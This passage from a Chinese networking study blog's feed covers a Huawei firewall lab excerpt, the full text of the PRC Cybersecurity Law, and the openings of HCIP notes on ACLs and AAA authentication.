ALG生成的Server-map表项</strong></p><pre class="line-numbers language-none"><code class="language-none">&lt;FW1&gt;display firewall server-map <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>FW1上已经生成了FTP数据通道的Server-map表项</li><li>注意在查看之前需要在R2上执行<strong>dir</strong>触发传输通道的流量。 </li></ul><h4 id="思考题"><a href="#思考题" class="headerlink" title="思考题"></a>思考题</h4><p>在防火墙上放通local安全域到其他区域的目的是什么？</p><blockquote><p><del><strong>在防火墙上放通local安全域到其他区域，主要的目的是为了允许该安全域内的计算机或设备与其他区域的计算机或设备进行通信和交互</strong></del>  某ChatGPT给出的答案不一定准确</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;华为防火墙技术概述&quot;&gt;&lt;a href=&quot;#华为防火墙技术概述&quot; class=&quot;headerlink&quot; title=&quot;华为防火墙技术概述&quot;&gt;&lt;/a&gt;华为防火墙技术概述&lt;/h2&gt;&lt;p&gt;[TOC]&lt;/p&gt;
&lt;h3 id=&quot;防火墙概述&quot;&gt;&lt;a href=&quot;#防火墙概述&quot; </summary>
      
    
    
    
    <category term="网络安全" scheme="https://shierjinghuang.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="HCIP" scheme="https://shierjinghuang.github.io/tags/HCIP/"/>
    
    <category term="防火墙技术" scheme="https://shierjinghuang.github.io/tags/%E9%98%B2%E7%81%AB%E5%A2%99%E6%8A%80%E6%9C%AF/"/>
    
  </entry>
  
  <entry>
    <title>网络安全法</title>
    <link href="https://shierjinghuang.github.io/2023/04/12/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%B3%95/"/>
    <id>https://shierjinghuang.github.io/2023/04/12/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%B3%95/</id>
    <published>2023-04-12T08:32:31.000Z</published>
    <updated>2023-04-25T07:36:09.205Z</updated>
    
    <content type="html"><![CDATA[<h4 id="目-录"><a href="#目-录" class="headerlink" title="目 录"></a>目 录</h4><p>[TOC]</p><h4 id="第一章-总-则"><a href="#第一章-总-则" class="headerlink" title="第一章 总 则"></a>第一章 总 则</h4><p><strong>第一条</strong> 为了保障网络安全，维护网络空间主权和国家安全、社会公共利益，保护公民、法人和其他组织的合法权益，促进经济社会信息化健康发展，制定本法。 </p><p><strong>第二条</strong> 在中华人民共和国境内建设、运营、维护和使用网络，以及网络安全的监督管理，适用本法。 </p><p><strong>第三条</strong> 国家坚持网络安全与信息化发展并重，遵循积极利用、科学发展、 依法管理、确保安全的方针，推进网络基础设施建设和互联互通，鼓励网络技术创新和应用，支持培养网络安全人才，建立健全网络安全保障体系，提高网络安全保护能力。 </p><p><strong>第四条</strong> 国家制定并不断完善网络安全战略，明确保障网络安全的基本要 求和主要目标，提出重点领域的网络安全政策、工作任务和措施。 </p><p><strong>第五条</strong> 国家采取措施，监测、防御、处置来源于中华人民共和国境内外的网络安全风险和威胁，保护关键信息基础设施免受攻击、侵入、干扰和破坏，依法惩治网络违法犯罪活动，维护网络空间安全和秩序。 </p><p><strong>第六条</strong> 国家倡导诚实守信、健康文明的网络行为，推动传播社会主义核心价值观，采取措施提高全社会的网络安全意识和水平，形成全社会共同参与促进网络安全的良好环境。 </p><p><strong>第七条</strong> 国家积极开展网络空间治理、网络技术研发和标准制定、打击网 络违法犯罪等方面的国际交流与合作，推动构建和平、安全、开放、合作的网络空间，建立多边、民主、透明的网络治理体系。 </p><p><strong>第八条</strong> 国家网信部门负责统筹协调网络安全工作和相关监督管理工作。国务院电信主管部门、公安部门和其他有关机关依照本法和有关法律、行政法规的规定，在各自职责范围内负责网络安全保护和监督管理工作。县级以上地方人民政府有关部门的网络安全保护和监督管理职责，按照国家有关规定确定。 </p><p><strong>第九条</strong> 网络运营者开展经营和服务活动，必须遵守法律、行政法规，尊重社会公德，遵守商业道德，诚实信用，履行网络安全保护义务，接受政府和社会的监督，承担社会责任。 </p><p><strong>第十条</strong> 建设、运营网络或者通过网络提供服务，应当依照法律、行政法规的规定和国家标准的强制性要求，采取技术措施和其他必要措施，保障网络安全、稳定运行，有效应对网络安全事件，防范网络违法犯罪活动，维护网络数据的完整性、保密性和可用性。</p><p><strong>第十一条</strong> 网络相关行业组织按照章程，加强行业自律，制定网络安全行 为规范，指导会员加强网络安全保护，提高网络安全保护水平，促进行业健康发展。 </p><p><strong>第十二条</strong> 国家保护公民、法人和其他组织依法使用网络的权利，促进网络接入普及，提升网络服务水平，为社会提供安全、便利的网络服务，保障网络信息依法有序自由流动。任何个人和组织使用网络应当遵守宪法法律，遵守公共秩序，尊重社会公德，不得危害网络安全，不得利用网络从事危害国家安全、荣誉和利益，煽动颠覆国家政权、推翻社会主义制度，煽动分裂国家、破坏国家统一，宣扬恐怖主义、极端主义，宣扬民族仇恨、民族歧视，传播暴力、淫秽色情信息，编造、传播虚假信息扰乱经济秩序和社会秩序，以及侵害他人名誉、隐私、知识产权和其他合法权益等活动。 </p><p><strong>第十三条</strong> 国家支持研究开发有利于未成年人健康成长的网络产品和服务，依法惩治利用网络从事危害未成年人身心健康的活动，为未成年人提供安全、健康的网络环境。 </p><p><strong>第十四条</strong> 任何个人和组织有权对危害网络安全的行为向网信、电信、公 安等部门举报。收到举报的部门应当及时依法作出处理；不属于本部门职责的，应当及时移送有权处理的部门。 有关部门应当对举报人的相关信息予以保密，保护举报人的合法权益。 </p><h4 id="第二章-网络安全支持与促进"><a href="#第二章-网络安全支持与促进" class="headerlink" title="第二章 网络安全支持与促进"></a>第二章 网络安全支持与促进</h4><p><strong>第十五条</strong> 国家建立和完善网络安全标准体系。国务院标准化行政主管部门和国务院其他有关部门根据各自的职责，组织制定并适时修订有关网络安全管理以及网络产品、服务和运行安全的国家标准、行业标准。国家支持企业、研究机构、高等学校、网络相关行业组织参与网络安全国家 标准、行业标准的制定。 </p><p><strong>第十六条</strong> 国务院和省、自治区、直辖市人民政府应当统筹规划，加大投 入，扶持重点网络安全技术产业和项目，支持网络安全技术的研究开发和应用，推广安全可信的网络产品和服务，保护网络技术知识产权，支持企业、研究机构 和高等学校等参与国家网络安全技术创新项目。 </p><p><strong>第十七条</strong> 国家推进网络安全社会化服务体系建设，鼓励有关企业、机构开展网络安全认证、检测和风险评估等安全服务。 </p><p><strong>第十八条</strong> 国家鼓励开发网络数据安全保护和利用技术，促进公共数据资源开放，推动技术创新和经济社会发展。 国家支持创新网络安全管理方式，运用网络新技术，提升网络安全保护水平。 </p><p><strong>第十九条</strong> 各级人民政府及其有关部门应当组织开展经常性的网络安全宣 传教育，并指导、督促有关单位做好网络安全宣传教育工作。大众传播媒介应当有针对性地面向社会进行网络安全宣传教育。 </p><p><strong>第二十条</strong> 国家支持企业和高等学校、职业学校等教育培训机构开展网络 安全相关教育与培训，采取多种方式培养网络安全人才，促进网络安全人才交流。 </p><h4 id="第三章-网络运行安全"><a href="#第三章-网络运行安全" class="headerlink" title="第三章 网络运行安全"></a>第三章 网络运行安全</h4><p>第一节 一般规定 </p><p><strong>第二十一条</strong> 国家实行网络安全等级保护制度。网络运营者应当按照网络安全等级保护制度的要求，履行下列安全保护义务，保障网络免受干扰、破坏或者未经授权的访问，防止网络数据泄露或者被窃取、篡改：</p><p>（一）制定内部安全管理制度和操作规程，确定网络安全负责人，落实网络安全保护责任； </p><p>（二）采取防范计算机病毒和网络攻击、网络侵入等危害网络安全行为的技术措施； </p><p>（三）采取监测、记录网络运行状态、网络安全事件的技术措施，并按照规定留存相关的网络日志不少于六个月； </p><p>（四）采取数据分类、重要数据备份和加密等措施； </p><p>（五）法律、行政法规规定的其他义务。 </p><p><strong>第二十二条</strong> 网络产品、服务应当符合相关国家标准的强制性要求。网络 产品、服务的提供者不得设置恶意程序；发现其网络产品、服务存在安全缺陷、漏洞等风险时，应当立即采取补救措施，按照规定及时告知用户并向有关主管部门报告。网络产品、服务的提供者应当为其产品、服务持续提供安全维护；在规定或 者当事人约定的期限内，不得终止提供安全维护。网络产品、服务具有收集用户信息功能的，其提供者应当向用户明示并取得 同意；涉及用户个人信息的，还应当遵守本法和有关法律、行政法规关于个人信息保护的规定。 </p><p><strong>第二十三条</strong> 网络关键设备和网络安全专用产品应当按照相关国家标准的强制性要求，由具备资格的机构安全认证合格或者安全检测符合要求后，方可销 售或者提供。国家网信部门会同国务院有关部门制定、公布网络关键设备和网络安全专用产品目录，并推动安全认证和安全检测结果互认，避免重复认证、检测。 </p><p><strong>第二十四条</strong> 网络运营者为用户办理网络接入、域名注册服务，办理固定电话、移动电话等入网手续，或者为用户提供信息发布、即时通讯等服务，在与用户签订协议或者确认提供服务时，应当要求用户提供真实身份信息。用户不提 供真实身份信息的，网络运营者不得为其提供相关服务。国家实施网络可信身份战略，支持研究开发安全、方便的电子身份认证技术，推动不同电子身份认证之间的互认。 </p><p><strong>第二十五条</strong> 网络运营者应当制定网络安全事件应急预案，及时处置系统漏洞、计算机病毒、网络攻击、网络侵入等安全风险；在发生危害网络安全的事件时，立即启动应急预案，采取相应的补救措施，并按照规定向有关主管部门报告。 </p><p><strong>第二十六条</strong> 开展网络安全认证、检测、风险评估等活动，向社会发布系统漏洞、计算机病毒、网络攻击、网络侵入等网络安全信息，应当遵守国家有关规定。 </p><p><strong>第二十七条</strong> 任何个人和组织不得从事非法侵入他人网络、干扰他人网络正常功能、窃取网络数据等危害网络安全的活动；不得提供专门用于从事侵入网 络、干扰网络正常功能及防护措施、窃取网络数据等危害网络安全活动的程序、工具；明知他人从事危害网络安全的活动的，不得为其提供技术支持、广告推广、支付结算等帮助。 </p><p><strong>第二十八条</strong> 网络运营者应当为公安机关、国家安全机关依法维护国家安全和侦查犯罪的活动提供技术支持和协助</p><p><strong>第二十九条</strong> 国家支持网络运营者之间在网络安全信息收集、分析、通报和应急处置等方面进行合作，提高网络运营者的安全保障能力。有关行业组织建立健全本行业的网络安全保护规范和协作机制，加强对网络安全风险的分析评估，定期向会员进行风险警示，支持、协助会员应对网络安全风险。 </p><p><strong>第三十条</strong> 网信部门和有关部门在履行网络安全保护职责中获取的信息，只能用于维护网络安全的需要，不得用于其他用途。 第二节 关键信息基础设施的运行安全 </p><p><strong>第三十一条</strong> 国家对公共通信和信息服务、能源、交通、水利、金融、公 共服务、电子政务等重要行业和领域，以及其他一旦遭到破坏、丧失功能或者数据泄露，可能严重危害国家安全、国计民生、公共利益的关键信息基础设施，在网络安全等级保护制度的基础上，实行重点保护。关键信息基础设施的具体范围和安全保护办法由国务院制定。 国家鼓励关键信息基础设施以外的网络运营者自愿参与关键信息基础设施 保护体系。 </p><p><strong>第三十二条</strong> 按照国务院规定的职责分工，负责关键信息基础设施安全保护工作的部门分别编制并组织实施本行业、本领域的关键信息基础设施安全规划，指导和监督关键信息基础设施运行安全保护工作。 </p><p><strong>第三十三条</strong> 建设关键信息基础设施应当确保其具有支持业务稳定、持续运行的性能，并保证安全技术措施同步规划、同步建设、同步使用。 </p><p><strong>第三十四条</strong> 除本法第二十一条的规定外，关键信息基础设施的运营者还应当履行下列安全保护义务： </p><p>（一）设置专门安全管理机构和安全管理负责人，并对该负责人和关键岗位的人员进行安全背景审查； </p><p>（二）定期对从业人员进行网络安全教育、技术培训和技能考核； </p><p>（三）对重要系统和数据库进行容灾备份； </p><p>（四）制定网络安全事件应急预案，并定期进行演练； </p><p>（五）法律、行政法规规定的其他义务。 </p><p><strong>第三十五条</strong> 关键信息基础设施的运营者采购网络产品和服务，可能影响国家安全的，应当通过国家网信部门会同国务院有关部门组织的国家安全审查。 </p><p><strong>第三十六条</strong> 关键信息基础设施的运营者采购网络产品和服务，应当按照规定与提供者签订安全保密协议，明确安全和保密义务与责任。 </p><p><strong>第三十七条</strong> 关键信息基础设施的运营者在中华人民共和国境内运营中收集和产生的个人信息和重要数据应当在境内存储。因业务需要，确需向境外提供的，应当按照国家网信部门会同国务院有关部门制定的办法进行安全评估；法律、行政法规另有规定的，依照其规定。 </p><p><strong>第三十八条</strong> 关键信息基础设施的运营者应当自行或者委托网络安全服务机构对其网络的安全性和可能存在的风险每年至少进行一次检测评估，并将检测 评估情况和改进措施报送相关负责关键信息基础设施安全保护工作的部门。 </p><p><strong>第三十九条</strong> 国家网信部门应当统筹协调有关部门对关键信息基础设施的安全保护采取下列措施： </p><p>一 对关键信息基础设施的安全风险进行抽查检测，提出改进措施，必要时可以委托网络安全服务机构对网络存在的安全风险进行检测评估；</p><p>二 定期组织关键信息基础设施的运营者进行网络安全应急演练，提高应对网络安全事件的水平和协同配合能力</p><p>三 促进有关部门、关键信息基础设施的运营者以及有关研究机构、网络安全服务机构等之间的网络安全信息共享</p><p>四 对网络安全事件的应急处置与网络功能的恢复等，提供技术支持和协助。 </p><h4 id="第四章-网络信息安全"><a href="#第四章-网络信息安全" class="headerlink" title="第四章 网络信息安全"></a>第四章 网络信息安全</h4><p><strong>第四十条</strong> 网络运营者应当对其收集的用户信息严格保密，并建立健全用户信息保护制度。 </p><p><strong>第四十一条</strong> 网络运营者收集、使用个人信息，应当遵循合法、正当、必要的原则，公开收集、使用规则，明示收集、使用信息的目的、方式和范围，并经被收集者同意。网络运营者不得收集与其提供的服务无关的个人信息，不得违反法律、行政法规的规定和双方的约定收集、使用个人信息，并应当依照法律、行政法规的规定和与用户的约定，处理其保存的个人信息。 </p><p><strong>第四十二条</strong> 网络运营者不得泄露、篡改、毁损其收集的个人信息；未经被收集者同意，不得向他人提供个人信息。但是，经过处理无法识别特定个人且不能复原的除外。网络运营者应当采取技术措施和其他必要措施，确保其收集的个人信息安全，防止信息泄露、毁损、丢失。在发生或者可能发生个人信息泄露、毁损、丢失的 情况时，应当立即采取补救措施，按照规定及时告知用户并向有关主管部门报告。 </p><p><strong>第四十三条</strong> 个人发现网络运营者违反法律、行政法规的规定或者双方的约定收集、使用其个人信息的，有权要求网络运营者删除其个人信息；发现网络运营者收集、存储的其个人信息有错误的，有权要求网络运营者予以更正。网络运营者应当采取措施予以删除或者更正。 </p><p><strong>第四十四条</strong> 任何个人和组织不得窃取或者以其他非法方式获取个人信息，不得非法出售或者非法向他人提供个人信息。 </p><p><strong>第四十五条</strong> 依法负有网络安全监督管理职责的部门及其工作人员，必须对在履行职责中知悉的个人信息、隐私和商业秘密严格保密，不得泄露、出售或者非法向他人提供。 </p><p><strong>第四十六条</strong> 任何个人和组织应当对其使用网络的行为负责，不得设立用于实施诈骗，传授犯罪方法，制作或者销售违禁物品、管制物品等违法犯罪活动的网站、通讯群组，不得利用网络发布涉及实施诈骗，制作或者销售违禁物品、管制物品以及其他违法犯罪活动的信息。 </p><p><strong>第四十七条</strong> 网络运营者应当加强对其用户发布的信息的管理，发现法律、行政法规禁止发布或者传输的信息的，应当立即停止传输该信息，采取消除等处置措施，防止信息扩散，保存有关记录，并向有关主管部门报告。 </p><p><strong>第四十八条</strong> 任何个人和组织发送的电子信息、提供的应用软件，不得设置恶意程序，不得含有法律、行政法规禁止发布或者传输的信息。电子信息发送服务提供者和应用软件下载服务提供者，应当履行安全管理义务，知道其用户有前款规定行为的，应当停止提供服务，采取消除等处置措施，保存有关记录，并向有关主管部门报告。 </p><p><strong>第四十九条</strong> 网络运营者应当建立网络信息安全投诉、举报制度，公布投诉、举报方式等信息，及时受理并处理有关网络信息安全的投诉和举报。 网络运营者对网信部门和有关部门依法实施的监督检查，应当予以配合。</p><p><strong>第五十条</strong> 国家网信部门和有关部门依法履行网络信息安全监督管理职责， 发现法律、行政法规禁止发布或者传输的信息的，应当要求网络运营者停止传输，采取消除等处置措施，保存有关记录；对来源于中华人民共和国境外的上述信息， 应当通知有关机构采取技术措施和其他必要措施阻断传播。 </p><h4 id="第五章-监测预警与应急处置"><a href="#第五章-监测预警与应急处置" class="headerlink" title="第五章 监测预警与应急处置"></a>第五章 监测预警与应急处置</h4><p><strong>第五十一条</strong> 国家建立网络安全监测预警和信息通报制度。国家网信部门应当统筹协调有关部门加强网络安全信息收集、分析和通报工作，按照规定统一发布网络安全监测预警信息。 </p><p><strong>第五十二条</strong> 负责关键信息基础设施安全保护工作的部门，应当建立健全本行业、本领域的网络安全监测预警和信息通报制度，并按照规定报送网络安全监测预警信息。 </p><p><strong>第五十三条</strong> 国家网信部门协调有关部门建立健全网络安全风险评估和应急工作机制，制定网络安全事件应急预案，并定期组织演练。负责关键信息基础设施安全保护工作的部门应当制定本行业、本领域的网络安全事件应急预案，并定期组织演练。网络安全事件应急预案应当按照事件发生后的危害程度、影响范围等因素对网络安全事件进行分级，并规定相应的应急处置措施。 </p><p><strong>第五十四条</strong> 网络安全事件发生的风险增大时，省级以上人民政府有关部门应当按照规定的权限和程序，并根据网络安全风险的特点和可能造成的危害， 采取下列措施： </p><p>（一）要求有关部门、机构和人员及时收集、报告有关信息，加强对网络安全风险的监测； </p><p>（二）组织有关部门、机构和专业人员，对网络安全风险信息进行分析评估，预测事件发生的可能性、影响范围和危害程度； </p><p>（三）向社会发布网络安全风险预警，发布避免、减轻危害的措施。 </p><p><strong>第五十五条</strong> 发生网络安全事件，应当立即启动网络安全事件应急预案，对网络安全事件进行调查和评估，要求网络运营者采取技术措施和其他必要措施，消除安全隐患，防止危害扩大，并及时向社会发布与公众有关的警示信息</p><p><strong>第五十六条</strong> 省级以上人民政府有关部门在履行网络安全监督管理职责中，发现网络存在较大安全风险或者发生安全事件的，可以按照规定的权限和程序对该网络的运营者的法定代表人或者主要负责人进行约谈。网络运营者应当按照要求采取措施，进行整改，消除隐患。 </p><p><strong>第五十七条</strong> 因网络安全事件，发生突发事件或者生产安全事故的，应当依照《中华人民共和国突发事件应对法》、《中华人民共和国安全生产法》等有 关法律、行政法规的规定处置。 </p><p><strong>第五十八条</strong> 因维护国家安全和社会公共秩序，处置重大突发社会安全事件的需要，经国务院决定或者批准，可以在特定区域对网络通信采取限制等临时措施。 </p><h4 id="第六章-法律责任"><a href="#第六章-法律责任" class="headerlink" title="第六章 法律责任"></a>第六章 法律责任</h4><p><strong>第五十九条</strong> 网络运营者不履行本法第二十一条、第二十五条规定的网络安全保护义务的，由有关主管部门责令改正，给予警告；拒不改正或者导致危害网络安全等后果的，处一万元以上十万元以下罚款，对直接负责的主管人员处五千元以上五万元以下罚款。关键信息基础设施的运营者不履行本法第三十三条、第三十四条、第三十六条、第三十八条规定的网络安全保护义务的，由有关主管部门责令改正，给予警告；拒不改正或者导致危害网络安全等后果的，处十万元以上一百万元以下罚款，对直接负责的主管人员处一万元以上十万元以下罚款。 </p><p><strong>第六十条</strong> 违反本法第二十二条第一款、第二款和第四十八条第一款规定，有下列行为之一的，由有关主管部门责令改正，给予警告；拒不改正或者导致危 害网络安全等后果的，处五万元以上五十万元以下罚款，对直接负责的主管人员处一万元以上十万元以下罚款： </p><p>（一）设置恶意程序的； </p><p>（二）对其产品、服务存在的安全缺陷、漏洞等风险未立即采取补救措施，或者未按照规定及时告知用户并向有关主管部门报告的； </p><p>（三）擅自终止为其产品、服务提供安全维护的。 </p><p><strong>第六十一条</strong> 网络运营者违反本法第二十四条第一款规定，未要求用户提供真实身份信息，或者对不提供真实身份信息的用户提供相关服务的，由有关主管部门责令改正；拒不改正或者情节严重的，处五万元以上五十万元以下罚款，并可以由有关主管部门责令暂停相关业务、停业整顿、关闭网站、吊销相关业务许可证或者吊销营业执照，对直接负责的主管人员和其他直接责任人员处一万元以上十万元以下罚款。 </p><p><strong>第六十二条</strong> 违反本法第二十六条规定，开展网络安全认证、检测、风险 评估等活动，或者向社会发布系统漏洞、计算机病毒、网络攻击、网络侵入等网络安全信息的，由有关主管部门责令改正，给予警告；拒不改正或者情节严重的，处一万元以上十万元以下罚款，并可以由有关主管部门责令暂停相关业务、停业 整顿、关闭网站、吊销相关业务许可证或者吊销营业执照，对直接负责的主管人 员和其他直接责任人员处五千元以上五万元以下罚款。 </p><p><strong>第六十三条</strong> 违反本法第二十七条规定，从事危害网络安全的活动，或者 提供专门用于从事危害网络安全活动的程序、工具，或者为他人从事危害网络安全的活动提供技术支持、广告推广、支付结算等帮助，尚不构成犯罪的，由公安机关没收违法所得，处五日以下拘留，可以并处五万元以上五十万元以下罚款；情节较重的，处五日以上十五日以下拘留，可以并处十万元以上一百万元以下罚款。 单位有前款行为的，由公安机关没收违法所得，处十万元以上一百万元以下罚款，并对直接负责的主管人员和其他直接责任人员依照前款规定处罚。违反本法第二十七条规定，受到治安管理处罚的人员，五年内不得从事网络安全管理和网络运营关键岗位的工作；受到刑事处罚的人员，终身不得从事网络安全管理和网络运营关键岗位的工作。 </p><p><strong>第六十四条</strong> 网络运营者、网络产品或者服务的提供者违反本法第二十二条第三款、第四十一条至第四十三条规定，侵害个人信息依法得到保护的权利的，由有关主管部门责令改正，可以根据情节单处或者并处警告、没收违法所得、处违法所得一倍以上十倍以下罚款，没有违法所得的，处一百万元以下罚款，对直接负责的主管人员和其他直接责任人员处一万元以上十万元以下罚款；情节严重的，并可以责令暂停相关业务、停业整顿、关闭网站、吊销相关业务许可证或者吊销营业执照。违反本法第四十四条规定，窃取或者以其他非法方式获取、非法出售或者非 法向他人提供个人信息，尚不构成犯罪的，由公安机关没收违法所得，并处违法 所得一倍以上十倍以下罚款，没有违法所得的，处一百万元以下罚款。 </p><p><strong>第六十五条</strong> 关键信息基础设施的运营者违反本法第三十五条规定，使用未经安全审查或者安全审查未通过的网络产品或者服务的，由有关主管部门责令停止使用，处采购金额一倍以上十倍以下罚款；对直接负责的主管人员和其他直接责任人员处一万元以上十万元以下罚款。 </p><p><strong>第六十六条</strong> 关键信息基础设施的运营者违反本法第三十七条规定，在境外存储网络数据，或者向境外提供网络数据的，由有关主管部门责令改正，给予 警告，没收违法所得，处五万元以上五十万元以下罚款，并可以责令暂停相关业务、停业整顿、关闭网站、吊销相关业务许可证或者吊销营业执照；对直接负责的主管人员和其他直接责任人员处一万元以上十万元以下罚款。 </p><p><strong>第六十七条</strong> 违反本法第四十六条规定，设立用于实施违法犯罪活动的网站、通讯群组，或者利用网络发布涉及实施违法犯罪活动的信息，尚不构成犯罪的，由公安机关处五日以下拘留，可以并处一万元以上十万元以下罚款；情节较重的，处五日以上十五日以下拘留，可以并处五万元以上五十万元以下罚款。关闭用于实施违法犯罪活动的网站、通讯群组。单位有前款行为的，由公安机关处十万元以上五十万元以下罚款，并对直接负责的主管人员和其他直接责任人员依照前款规定处罚。 </p><p><strong>第六十八条</strong> 网络运营者违反本法第四十七条规定，对法律、行政法规禁止发布或者传输的信息未停止传输、采取消除等处置措施、保存有关记录的，由有关主管部门责令改正，给予警告，没收违法所得；拒不改正或者情节严重的， 处十万元以上五十万元以下罚款，并可以责令暂停相关业务、停业整顿、关闭网站、吊销相关业务许可证或者吊销营业执照，对直接负责的主管人员和其他直接责任人员处一万元以上十万元以下罚款。电子信息发送服务提供者、应用软件下载服务提供者，不履行本法第四十八条第二款规定的安全管理义务的，依照前款规定处罚。 </p><p><strong>第六十九条</strong> 网络运营者违反本法规定，有下列行为之一的，由有关主管部门责令改正；拒不改正或者情节严重的，处五万元以上五十万元以下罚款，对直接负责的主管人员和其他直接责任人员，处一万元以上十万元以下罚款</p><p>（一）不按照有关部门的要求对法律、行政法规禁止发布或者传输的信息，采取停止传输、消除等处置措施的； </p><p>（二）拒绝、阻碍有关部门依法实施的监督检查的； </p><p>（三）拒不向公安机关、国家安全机关提供技术支持和协助的。 </p><p><strong>第七十条</strong> 发布或者传输本法第十二条第二款和其他法律、行政法规禁止发布或者传输的信息的，依照有关法律、行政法规的规定处罚。 </p><p><strong>第七十一条</strong> 有本法规定的违法行为的，依照有关法律、行政法规的规定记入信用档案，并予以公示。 </p><p><strong>第七十二条</strong> 国家机关政务网络的运营者不履行本法规定的网络安全保护义务的，由其上级机关或者有关机关责令改正；对直接负责的主管人员和其他直接责任人员依法给予处分。 </p><p><strong>第七十三条</strong> 网信部门和有关部门违反本法第三十条规定，将在履行网络安全保护职责中获取的信息用于其他用途的，对直接负责的主管人员和其他直接责任人员依法给予处分。网信部门和有关部门的工作人员玩忽职守、滥用职权、徇私舞弊，尚不构成犯罪的，依法给予处分。 </p><p><strong>第七十四条</strong> 违反本法规定，给他人造成损害的，依法承担民事责任。违反本法规定，构成违反治安管理行为的，依法给予治安管理处罚；构成犯 罪的，依法追究刑事责任。 </p><p><strong>第七十五条</strong> 境外的机构、组织、个人从事攻击、侵入、干扰、破坏等危 害中华人民共和国的关键信息基础设施的活动，造成严重后果的，依法追究法律责任；国务院公安部门和有关部门并可以决定对该机构、组织、个人采取冻结财 产或者其他必要的制裁措施。 </p><h4 id="第七章-附-则"><a href="#第七章-附-则" class="headerlink" title="第七章 附 则"></a>第七章 附 则</h4><p><strong>第七十六条</strong> 本法下列用语的含义： </p><p>（一）网络，是指由计算机或者其他信息终端及相关设备组成的按照一定的规则和程序对信息进行收集、存储、传输、交换、处理的系统。 </p><p>（二）网络安全，是指通过采取必要措施，防范对网络的攻击、侵入、干扰、破坏和非法使用以及意外事故，使网络处于稳定可靠运行的状态，以及保障网络数据的完整性、保密性、可用性的能力。 </p><p>（三）网络运营者，是指网络的所有者、管理者和网络服务提供者。 </p><p>（四）网络数据，是指通过网络收集、存储、传输、处理和产生的各种电子数据。 </p><p>（五）个人信息，是指以电子或者其他方式记录的能够单独或者与其他信息结合识别自然人个人身份的各种信息，包括但不限于自然人的姓名、出生日期、 身份证件号码、个人生物识别信息、住址、电话号码等。 </p><p><strong>第七十七条</strong> 存储、处理涉及国家秘密信息的网络的运行安全保护，除应 当遵守本法外，还应当遵守保密法律、行政法规的规定。 </p><p><strong>第七十八条</strong> 军事网络的安全保护，由中央军事委员会另行规定。 </p><p><strong>第七十九条</strong> 本法自 2017 年 6 月 1 日起施行。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;目-录&quot;&gt;&lt;a href=&quot;#目-录&quot; class=&quot;headerlink&quot; title=&quot;目 录&quot;&gt;&lt;/a&gt;目 录&lt;/h4&gt;&lt;p&gt;[TOC]&lt;/p&gt;
&lt;h4 id=&quot;第一章-总-则&quot;&gt;&lt;a href=&quot;#第一章-总-则&quot; class=&quot;headerlink&quot; t</summary>
      
    
    
    
    <category term="网络安全" scheme="https://shierjinghuang.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="法律法规" scheme="https://shierjinghuang.github.io/tags/%E6%B3%95%E5%BE%8B%E6%B3%95%E8%A7%84/"/>
    
  </entry>
  
  <entry>
    <title>ACL 访问控制列表</title>
    <link href="https://shierjinghuang.github.io/2023/04/02/%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6%E5%88%97%E8%A1%A8%20ACL/"/>
    <id>https://shierjinghuang.github.io/2023/04/02/%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6%E5%88%97%E8%A1%A8%20ACL/</id>
    <published>2023-04-02T02:58:35.000Z</published>
    <updated>2023-04-09T07:11:48.418Z</updated>
    
    <content type="html"><![CDATA[<center><h1>ACL 访问控制列表</h1></center>ACL可以通过对网络中报文流的精确识别，与其他技术结合，达到控制网络访问行为、防止网络攻击和提高网络带宽利用率的目的，从而切实保障网络环境的安全性和网络服务质量的可靠性<h3 id="ACL技术概述"><a href="#ACL技术概述" class="headerlink" title="ACL技术概述"></a>ACL技术概述</h3>]]></content>
    
    
      
      
    <summary type="html">&lt;center&gt;&lt;h1&gt;ACL 访问控制列表&lt;/h1&gt;&lt;/center&gt;
ACL可以通过对网络中报文流的精确识别，与其他技术结合，达到控制网络访问行为、防止网络攻击和提高网络带宽利用率的目的，从而切实保障网络环境的安全性和网络服务质量的可靠性

&lt;h3 id=&quot;ACL技术概述&quot;&gt;</summary>
      
    
    
    
    <category term="HCIP" scheme="https://shierjinghuang.github.io/categories/HCIP/"/>
    
    
    <category term="HCIP" scheme="https://shierjinghuang.github.io/tags/HCIP/"/>
    
    <category term="ACL" scheme="https://shierjinghuang.github.io/tags/ACL/"/>
    
  </entry>
  
  <entry>
    <title>AAA 认证、授权及计费</title>
    <link href="https://shierjinghuang.github.io/2023/04/02/AAA%20%E8%AE%A4%E8%AF%81%E5%8F%8A%E9%85%8D%E7%BD%AE/"/>
    <id>https://shierjinghuang.github.io/2023/04/02/AAA%20%E8%AE%A4%E8%AF%81%E5%8F%8A%E9%85%8D%E7%BD%AE/</id>
    <published>2023-04-02T01:28:32.000Z</published>
    <updated>2023-04-09T07:11:31.455Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p><font color="FF6600">AAA（Authentication, Authorization, and Accounting）是一种管理框架，它提供了授权部分用户访问指定资源和记录这些用户操作行为的安全机制。因其具有良好的可扩展性，并且容易实现用户信息的集中管理而被广泛使用</font></p></blockquote><ul><li>AAA可以通过多种协议来实现，在实际应用中，最常使用RADIUS协议</li></ul><h3 id="AAA概述"><a href="#AAA概述" class="headerlink" title="AAA概述"></a>AAA概述</h3><p>AAA是Authentication（认证）、Authorization（授权）和Accounting（计费）的简称，是网络安全的一种管理机制，提供了认证、授权、计费三种安全功能</p><ul><li><strong>认证 Authentication</strong>：验证用户是否可以获得访问权，确定哪些用户可以访问网络</li><li><strong>授权 Authorization</strong>：授权用户可以使用哪些服务</li><li><strong>计费 Accounting</strong>：记录用户使用网络资源的情况</li><li>网络运营商 ISP: 需要验证家庭宽带用户的账号密码之后才允许其上网，并记录用户的上网时长或上网流量等内容</li></ul><p><strong>AAA常见架构</strong>:AAA常见网络架构中包括用户、NAS（Network Access Server）、AAA服务器（AAA Server）</p><h4 id="认证-Authentication"><a href="#认证-Authentication" class="headerlink" title="认证 Authentication:"></a>认证 